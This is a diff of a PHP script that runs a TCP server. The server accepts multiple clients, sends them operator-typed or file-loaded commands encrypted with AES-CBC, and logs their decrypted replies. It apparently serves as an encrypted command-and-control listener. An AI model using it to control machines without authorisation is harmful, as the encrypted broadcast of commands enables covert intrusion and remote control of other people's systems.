@@ -1,87 +1,91 @@
 #!/usr/bin/php -d memory_limit=2048M
 <?php
-	set_time_limit(0);
+	ini_set('display_errors', 1);
+	ini_set('display_startup_errors', 1);
+	error_reporting(E_ALL);
+
 	ob_implicit_flush(1);
 	define("DELIMITER", "-------------------------------------");
 	define("LOGFILE",".log");
+	define("BUFFER_LEN", 4096);
+	define("STREAM_BUFFER_LEN", 1024);
 
-	$short = "h:p:";
-	$long  = array(
-		"host:",
-		"port:"
-	);
-	$opts  = getopt($short,$long);
+	$opensslpath = './Openssl_EncryptDecrypt.php';
+	$opts = getopt("h:p:",["host:","port:"]);
+	$log  = '';
 
-	(count($opts) === 2) or die("Assign remote ip [-h/--host] and port [-p/--port]\n");
-	
+	(count($opts) === 2) || die("Assign remote ip [-h/--host] and port [-p/--port]\n");
 	$host_addr 	= array_key_exists("host", $opts) ? trim($opts['host']) : trim($opts['h']);
 	$host_port 	= array_key_exists("port", $opts) ? trim($opts['port']) : trim($opts['p']);
 
 	($master_sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP))
-	or die("[\33[91m!\33[0m] socket_create() failed: reason: "
-		.socket_strerror(socket_last_error())."\n");
+	|| die("[\33[91m!\33[0m] socket_create() failed: reason: "
+			.socket_strerror(socket_last_error())."\n");
 
+	socket_set_nonblock($master_sock);
 	socket_set_option($master_sock, SOL_SOCKET, SO_REUSEADDR, 1);
 
 	(socket_bind($master_sock, $host_addr, (int)$host_port))
-	or die("[\33[91m!\33[0m] socket_bind() failed: reason: "
-		.socket_strerror(socket_last_error($master_sock))."\n");
+	|| die("[\33[91m!\33[0m] socket_bind() failed: reason: "
+			.socket_strerror(socket_last_error($master_sock))."\n");
 
 	(socket_listen($master_sock))
-	or die("[\33[91m!\33[0m] socket_listen() failed: reason: "
-		.socket_strerror(socket_last_error($master_sock))."\n");
+	|| die("[\33[91m!\33[0m] socket_listen() failed: reason: "
+			.socket_strerror(socket_last_error($master_sock))."\n");
 	
-
-	require_once 'Openssl_EncryptDecrypt.php';
-	$openssl_encrypt_decrypt = new Openssl_EncryptDecrypt;
+	if(file_exists($opensslpath)){
+		require_once $opensslpath;
+		$openssl_encrypt_decrypt = new Openssl_EncryptDecrypt;
+	} else { 
+		die('error: openssl class missing');
+	}
 	
-	if(($key = $openssl_encrypt_decrypt->fetch_key()) !== false){
-		if(! defined('ENCRYPTION_KEY')){
-			define('ENCRYPTION_KEY', $key);
-		} else {
-			_log(LOGFILE, 'failed to fetch key.');
-			die('failed to fetch key.');
-		}
+	if(($key = $openssl_encrypt_decrypt->fetch_key()) !== false)
+	{
+		if(!defined('ENCRYPTION_KEY')){ define('ENCRYPTION_KEY', $key); }
+		else { die('error: failed to fetch key.'); }
 	}
 
-	
-	_log(LOGFILE, "Host [".$host_addr.":".$host_port."] listening for incomming connections..\n\n");
-	echo "\33[36mHost [".$host_addr.":".$host_port."] listening for incomming connections..\33[0m\n\n";
-	
-	$clients 		   = [$master_sock];
+	$log = "Host [".$host_addr.":".$host_port."] listening for incomming connections..\n\n";
+	write_log(LOGFILE, $log);
+	echo $log;
+
+	$clients = [ $master_sock ];
 	$connected_clients = [];
 
-	while (true) {
-		
+	while (1) {
 	    // create a copy, so $clients doesn't get modified by socket_select()
 		$write = $recv = $clients;
 		$except = NULL;
-		$now = date('H:i:s');
+		$now = date('Y-m-d H:i:s');
+		$err = '';
 
-	    if(! socket_select($recv, $write, $except, NULL)){
-			die("\33[91m[!] socket_select() failed: reason: "
-			.socket_strerror(socket_last_error($master_sock))."\33[0m\n");
+	    if(socket_select($recv, $write, $except, NULL) === false){
+			$err = "\33[91m[!] socket_select() failed: reason: "
+					.socket_strerror(socket_last_error($master_sock))."\33[0m\n";
+			write_log(LOGFILE, $err);
+			echo $err;
 	    }
 
 	    if(in_array($master_sock, $recv))
 	    {
-			if (! ($clients[] = $recv_sock = socket_accept($master_sock))) {
-				die("\33[91m[!] socket_accept() failed: reason: "
-				.socket_strerror(socket_last_error($master_sock))."\33[0m\n");
+			if(!($clients[] = $recv_sock = socket_accept($master_sock))) {
+				$err = "\33[91m[!] socket_accept() failed: reason: "
+						.socket_strerror(socket_last_error($master_sock))."\33[0m\n";
+				write_log(LOGFILE, $err);
+				echo $err;
 		    }
 
 			socket_getpeername($recv_sock, $ip, $port);
-		    $connected_clients [] = array("ip" => $ip, "port" => $port);
-
-			_log(LOGFILE, "Client connected on IP: [".$ip.":".$port."]\n");
+			$connected_clients [] = ["ip" => $ip, "port" => $port];
+			
+			write_log(LOGFILE, "Client connected on IP: [".$ip.":".$port."]\n");
 			echo "[".$now."] \33[32mClient connected on IP: [".$ip.":".$port."]\33[0m\n";
 			
 			// TODO: key-exchange
-
 	        // remove the listening socket from the clients-with-data array
-	        $key = array_search($clients, $recv);
-	        unset($recv[$key]);
-
+	        $recv_key = array_search($clients, $recv);
+	        unset($recv[$recv_key]);
 	        continue;
 	    }
 
@@ -94,72 +98,95 @@
 			$data = "";
 			$all_bytes = 0;
 
-	        while(false !== ($bytes = socket_recv($recv_sock, $buffer, 4096, MSG_DONTWAIT)))
+	        while(false !== ($bytes = socket_recv($recv_sock, $buffer, BUFFER_LEN, MSG_DONTWAIT)))
 	        {
 	        	$all_bytes += $bytes;
 				echo "\33[94mBytes recieved: ".$bytes."\33[0m\n";
         	  	$lastError = socket_last_error($recv_sock);
-
-			    if($bytes === 0){		
+				if($bytes === 0)
+				{		
 					if($lastError !== 0){
-						_log(LOGFILE, "Error: ".$lastError." :: ".socket_strerror($lastError)."\n");
-						echo "Error: ".$lastError." :: ".socket_strerror($lastError)."\n";
+						$err = "Error: ".$lastError." :: ".socket_strerror($lastError)."\n";
+						write_log(LOGFILE, $err);
+						echo $err;
 					}
-	   
 			        $key  = array_search($recv_sock, $clients);
-		            $_key = array_search($port, array_map(function($v){return $v['port'];},$connected_clients));
-		            
+		            $_key = array_search($port, array_map(function($c){return $c['port'];},$connected_clients));
 		            unset($clients[$key]);
 		            unset($recv[$key]);
 		            unset($write[$key]);
 					unset($connected_clients[$_key]); 	// in non-local environment - ip instead of port
-					
-					_log(LOGFILE, "Client ".$ip.":".$port." disconnected.\n");
+					write_log(LOGFILE, "Client ".$ip.":".$port." disconnected.\n");
 		            echo "[".$now."] \33[91mClient ".$ip.":".$port." disconnected.\33[0m\n";
 		            break;
 			    }
 			    else if ($bytes > 0){
-			        $data .= $buffer;
-			    }
+					$data .= $buffer;
+				}
 			    else {
-					if($lastError !== 0){
-						"No data\nError: ".$lastError." :: ".socket_strerror($lastError)."\n";
-					}
+					if($lastError !== 0){ "No data\nError: ".$lastError." :: ".socket_strerror($lastError)."\n"; }
 			    }
 	        }
 
-			if($all_bytes < 4096){
-				echo "\33[95mOverall bytes recieved: ".$all_bytes."\33[0m\n";
-				_log(LOGFILE, "Overall bytes recieved: ".$all_bytes."\n");
+			if($all_bytes < BUFFER_LEN){
+				$log = "Overall bytes recieved: ".$all_bytes."\n";
+				echo $log;
+				write_log(LOGFILE, $log);
 			}
-	        if(! empty($data)){
+			if(!empty($data))
+			{
 				$temp_data = $data;
-				if(! ($data = $openssl_encrypt_decrypt->decrypt_cbc($data, ENCRYPTION_KEY))){
+				if(!($data = $openssl_encrypt_decrypt->decrypt_cbc($data, ENCRYPTION_KEY))){
 					$data = $temp_data;
 				}
-				
-				_log(LOGFILE,
-					"Client [".$ip.":".$port."]\n"
-					.DELIMITER."\n"
-					.$data."\n"
-					.DELIMITER."\n"
-				);
-				echo "[".$now."] Client [\33[36m".$ip.":".$port."\33[0m]\n"
-					.DELIMITER."\n"
-					.$data."\n"
-					.DELIMITER."\n";
+				$log = "Client [".$ip.":".$port."]\n"
+					   .DELIMITER."\n"
+					   .$data."\n"
+					   .DELIMITER."\n";
+				write_log(LOGFILE, $log);
+				echo $log;
 	        }
 		}
-		$line = readline(">>> ");
-		if(! empty($line)){
-			readline_add_history($line);
+		$stdin = fopen('php://stdin', 'r');
+		stream_set_blocking($stdin, 0);
+		$_read   = [ $stdin ];
+		$_write  = null;
+		$_except = null;
+		/**
+		 * tv_sec  - num of seconds		 - 0.2
+		 * tv_usec - num of microseconds - 500000 = 0.5
+		 * --------------------------------------------
+		 * -from php.net
+		 * It is much better to specify a timeout value of a few seconds, although if 
+		 * you need to be checking and running other code concurrently, using a timeout 
+		 * value of at least 200000 microseconds will help reduce the CPU usage of your 
+		 * script. 
+		 */
+		if(($result = stream_select($_read, $_write, $_except, 0.2, 500000)) !== false){
+			if($result === 0)  { continue; } // no data, continuing iteration
+			$line = stream_get_line($stdin, STREAM_BUFFER_LEN, "\n");
+			fclose($stdin);
+		} else {
+			echo "error: stream_select() failed.\n";
+			continue;
 		}
 
+		if(empty($line)){
+			continue;
+		}
+		else if($line === 'clients'){
+			echo "\33[36mClients: ".(count($clients)-1)."\33[0m\n";
+			print_r($connected_clients);
+		}
+		else if($line === 'exit'){
+			echo "Closing master socket..\n";
+			socket_close($master_sock);	
+			exit(0);
+		}
 		// reading/sending a file of commands
-		if(preg_match('/^(\-f)\s(\.{0,2}\/)*\w*\.\w{2,3}$/', $line))
+		else if(preg_match('/^(\-f)\s(\.{0,2}\/)*\w*\.\w{2,3}$/', $line))
 		{
 			$file = substr($line, 3);
-
 			if(file_exists($file))
 			{
 				$fp = fopen($file, 'rb');
@@ -167,20 +194,14 @@
 				fclose($fp);
 				$full_cmd = "";
 				
-				foreach ($cmdsarr as $cmd){
-					$full_cmd .= trim($cmd);
-				}
-
+				foreach ($cmdsarr as $cmd){ $full_cmd .= trim($cmd); }
 				$full_cmd = $openssl_encrypt_decrypt->encrypt_cbc($full_cmd, ENCRYPTION_KEY);
-
 				foreach ($write as $send_sock)
 		  		{
-			        if($send_sock == $master_sock){
-			            continue;
-					}
+			        if($send_sock === $master_sock){ continue; }
 			        else if(! @socket_write($send_sock, $full_cmd."\n", strlen($full_cmd))){	
 						echo "[\33[91mWrite error\33[0m]: "
-						.socket_strerror(socket_last_error($send_sock))."\n";
+							.socket_strerror(socket_last_error($send_sock))."\n";
 			        }	
 		    	}
 				continue;
@@ -191,39 +212,20 @@
 			}
 		}
 
-	    switch ($line)
-	    {
-	    	case 'clients':
-	    		echo "\33[36mClients: ".(count($clients)-1)."\33[0m\n";
-	    		print_r($connected_clients);
-	    		break;
-
-	    	case 'exit':
-				echo "Closing master socket..\n";
-				socket_close($master_sock);	
-				exit(0);
-
-	    	default:
-	    		break;
-	    }
-
 		if(!empty($connected_clients) && !empty($write)){
 		    if(!empty($line) 
-		    	&& $line != 'clients'
-				&& $line != 'exit')
+		    	&& $line !== 'clients'
+				&& $line !== 'exit')
 		    {
 				$line = $openssl_encrypt_decrypt->encrypt_cbc($line, ENCRYPTION_KEY);
 				foreach ($write as $send_sock)
 				{
-			        if($send_sock == $master_sock){
-						continue;
-					}
+			        if($send_sock == $master_sock){ continue; }
 					else if(! @socket_write($send_sock, $line."\n", strlen($line))){
 						echo "\33[91m[Write error\33[0m]: "
 						.socket_strerror(socket_last_error($send_sock))."\n";
 			        }
 			    }
-			    sleep(1); // wait for response
 			}
 		}
 		if(count($clients) === 1){	// only master socket => no clients
@@ -231,13 +233,14 @@
 			$line = "";
 		}
 	}
-	_log(LOGFILE,"Closing master socket..\n");
-	echo "Closing master socket..\n";
+	$log = "Closing master socket..\n";
+	write_log(LOGFILE,$log);
+	echo $log;
 	socket_close($master_sock);
 	exit(0);
 
-
-	function _log($file,$str){
-		return (file_put_contents($file, '['.date('d-m-Y H:i:s').']'.$str, FILE_APPEND) !== false);
-	}
+/***********************************************************/
+function write_log($file,$str){
+	return (file_put_contents($file, '['.date('d-m-Y H:i:s').']'.$str, FILE_APPEND));
+}
 ?>
